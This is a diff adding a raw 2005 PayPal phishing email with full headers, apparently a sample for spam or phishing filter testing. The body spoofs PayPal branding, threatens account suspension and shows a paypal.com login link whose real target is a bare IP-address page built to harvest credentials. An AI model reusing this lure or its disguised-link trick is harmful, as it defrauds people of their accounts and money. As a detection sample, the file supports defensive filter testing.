@@ -1,0 +1,121 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 2476F2A895
+ for <user@example.com>; Tue, 13 Dec 2005 13:34:57 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 0D627621C9A; Tue, 13 Dec 2005 13:34:57 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id E2125621C95
+ for <user@example.com>; Tue, 13 Dec 2005 13:34:56 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id NAA30481
+ for user@example.com; Tue, 13 Dec 2005 13:34:56 -0500
+Received: from mirror.dizinc.com (72-29-64-58.dimenoc.com [72.29.64.58] (may
+ be forged)) by mail.example.com with ESMTP id NAA30473
+ for <user@example.com>; Tue, 13 Dec 2005 13:34:55 -0500
+Message-Id: <200512131834.NAA30473@mail.example.com>
+Received: from [86.105.35.162] (port=50061 helo=User)
+ by mirror.dizinc.com with esmtpa (Exim 4.52)
+ id 1EmEwo-0005f2-2E; Tue, 13 Dec 2005 13:32:22 -0500
+Reply-To: <norply@paypal.com>
+From: "PayPal" <service@paypal.com>
+Subject: Notification of Limited Account Access(Routing Code:
+ C840-L001-Q190-T1812)
+Date: Tue, 13 Dec 2005 08:37:08 -0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - mirror.dizinc.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - paypal.com
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 254
+
+<html>
+<head>
+</head>
+<body>
+<div align="left"><a href="http://www.paypal.com">
+  <img
+src="http://www.paypal.com/en_US/i/header/t1Hdr_hpGraphic_563x115.jpg"
+border="0" width="563" height="115"></a>&nbsp;
+</div>
+<table align="center" border="0" cellpadding="0" cellspacing="0"
+width="600">
+<tbody>
+<tr>
+<td colspan="3"><img src="pp.files/pixel.gif" height="2" width="2"></td>
+</tr>
+</tbody>
+</table>
+<a href="http://www.paypal.com/cgi-bin/webscr?cmd=_login-run">
+</a>
+<table border="0" width="50%">
+<tbody>
+<tr>
+<td>
+<p><font size="2"><font face="Verdana">Dear valued&nbsp;<strong><strong><span
+style="font-size: 10pt; color: black; font-family: Verdana;">PayPal<sup>&reg;</sup></span></strong>&nbsp;</strong>member</font>:&nbsp;<br>
+</font><br>
+</p>
+<p><font face="Verdana" size="2">It has come to our attention
+that your&nbsp;<span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>&reg;</sup></strong></span>
+account information needs to be&nbsp;updated as part of our continuing
+commitment to protect your account and to&nbsp;reduce the instance of
+fraud on our website.&nbsp;</font><font face="Verdana" size="2"><font
+face="Verdana" size="2"> If you could please take 5-10
+minutes&nbsp;out of your </font><font face="Verdana" size="2">online </font><font
+face="Verdana" size="2">experience and update your personal records
+you will not run into&nbsp;any future </font><font face="Verdana"
+size="2">problems with the online service.&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></font></p>
+<font face="Verdana" size="2">
+<p><font face="Verdana" size="2">However, failure to update your
+records will result in account suspension.&nbsp;<br>
+&nbsp;<br>
+<br>
+Once you have updated your account records, your&nbsp;<span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>&reg;</sup></strong></span>
+session will not be&nbsp;interrupted and will continue as normal. </font></p>
+<p><font face="Verdana" size="2">To update your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>&reg;</sup></strong></span>
+records click on the following link:&nbsp;<br>
+</font> 
+<a href="http://72.29.74.191/~moderna/images/paypal/paypal/">http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a></p>
+<p><font face="Verdana" size="2"></font>&nbsp;</p>
+<p><font face="Verdana" size="2">Thank You. &nbsp;<br>
+<span style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>&reg;
+</sup><span
+style="font-size: 10pt; color: black; font-family: Verdana;">UPDATE </span></strong><span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>TEAM</strong></span></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</font></p>
+<img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif"
+border="0" width="200" height="50"> <font face="Verdana" size="2">
+<p><font face="Verdana" size="2">Accounts Management As outlined
+in our User Agreement, <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>&reg;</sup></strong></span>
+will&nbsp;periodically send you information about site changes and
+enhancements. </font></p>
+</font></font></td>
+</tr>
+</tbody>
+</table>
+<a href="http://www.paypal.com/cgi-bin/webscr?cmd=_login-run"> </a>
+</body>
+</html>
+ 
+WLMFNFKXZTMJVMONVOKOMIWFEHXKVNWLXYOVUC
